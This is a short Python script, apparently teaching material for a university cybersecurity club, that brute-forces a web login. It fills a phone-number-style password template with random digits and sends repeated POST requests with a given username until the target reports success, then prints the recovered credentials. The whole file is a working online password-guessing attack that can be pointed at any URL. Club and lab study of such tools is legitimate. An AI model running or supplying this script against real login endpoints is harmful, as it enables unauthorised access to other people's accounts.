import requests as req
import argparse
import random
from component.logo import showLogo

def generatePhone(template: str):
  rng = [str(random.randint(0, 9)) for _ in range(template.count("*"))]

  for number in rng:
    template = template.replace("*", number, 1)
  
  return template

def argumentParser():
  parser = argparse.ArgumentParser(description="Bruteforce example for MSU Cybersecurity Club")

  parser.add_argument(
    "-m",
    "--method",
    choices=["GET", "POST"],
    default="GET",
    type=str,
    help="HTTP method to use"
  )

  parser.add_argument(
    "-u",
    "--username",
    type=str,
    help="Username or email or either"
  )

  parser.add_argument(
    "-p",
    "--password",
    type=str,
    help="Password to bruteforce Ex.0987***21, 0-9 will replace to (*)"
  )

  parser.add_argument(
    "-v",
    "--verbose",
    action="store_true",
    help="Verbose bruteforce"
  )

  parser.add_argument(
    "url",
    metavar="URL",
    type=str,
    help="Target url to bruteforce"
  )

  return parser.parse_args()

def main():
  showLogo()
  argument = argumentParser()
  argUrl: str  = argument.url
  argMethod: str = argument.method
  argUsername: str = argument.username
  argPassword: str = argument.password

  if argMethod.lower() == "get":
    try:
      res = req.get(argUrl)
      print(res.json())
    except req.exceptions.MissingSchema:
      print("It isn't URL!")

  if argMethod.lower() == "post":
    memo = []
    while True:
      password = generatePhone(argPassword)

      if password in memo:
        continue

      jBody = {"username": argUsername, "password": password}
      res = req.post(argUrl, json=jBody)
      
      if argument.verbose:
        print(password)
      memo.append(password)

      print(f">> {password} List:{len(memo)}",end="\r")
      if res.json()["status"] == 200:
        print(f"Username is: {argUsername}")
        print(f"Password is: {password}")
        break
      

if __name__ == "__main__":
  main()